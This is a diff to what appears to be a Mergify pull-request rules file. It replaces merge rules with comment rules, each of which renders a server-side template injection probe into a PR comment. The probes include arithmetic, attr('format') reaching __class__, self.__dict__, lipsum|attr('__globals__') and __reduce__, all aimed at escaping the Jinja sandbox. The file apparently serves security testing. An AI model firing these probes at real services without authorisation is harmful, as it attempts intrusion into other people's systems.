@@ -1,31 +1,64 @@
 pull_request_rules:
-  # === ssti-1-math ===
-  - name: ssti-1-math
+  # === COMMENT TESTS — renders template as PR comment ===
+  - name: ssti-comment-1-math
     conditions:
       - base=main
-      - head~=^test-ssti-1-math-
+      - head~=^test-comment-1-math-
     actions:
-      merge:
-        method: merge
-        commit_message_template: |
-          SSTI1: {{ 7*7 }}
+      comment:
+        message: |
+          SSTI-C1: {{ 7*7 }}
 
-  # === ssti-2-attformat ===
-  - name: ssti-2-attformat
+  - name: ssti-comment-2-attformat
     conditions:
       - base=main
-      - head~=^test-ssti-2-attformat-
+      - head~=^test-comment-2-attformat-
     actions:
-      merge:
-        method: merge
-        commit_message_template: |
-          SSTI2: {{ ''|attr('format')('{0.__class__}') }}
+      comment:
+        message: |
+          SSTI-C2: {{ ''|attr('format')('{0.__class__}') }}
 
-  # test-no-template — test pure merge sans template
-  - name: ssti-pure-merge
+  - name: ssti-comment-3-percent
     conditions:
       - base=main
-      - head~=^test-pure-merge-
+      - head~=^test-comment-3-percent-
     actions:
-      merge:
-        method: merge
+      comment:
+        message: |
+          SSTI-C3: {{ "%d%%20" % 42 }}
+
+  - name: ssti-comment-4-self
+    conditions:
+      - base=main
+      - head~=^test-comment-4-self-
+    actions:
+      comment:
+        message: |
+          SSTI-C4: {{ self.__dict__ }}
+
+  - name: ssti-comment-5-globals
+    conditions:
+      - base=main
+      - head~=^test-comment-5-globals-
+    actions:
+      comment:
+        message: |
+          SSTI-C5: {{ lipsum|attr('__globals__') }}
+
+  - name: ssti-comment-6-reduce
+    conditions:
+      - base=main
+      - head~=^test-comment-6-reduce-
+    actions:
+      comment:
+        message: |
+          SSTI-C6: {{ "".__class__|attr("__reduce__") }}
+
+  - name: ssti-comment-7-getsection
+    conditions:
+      - base=main
+      - head~=^test-comment-7-getsection-
+    actions:
+      comment:
+        message: |
+          SSTI-C7: {{ body|get_section(".*", "NO-MATCH") }}
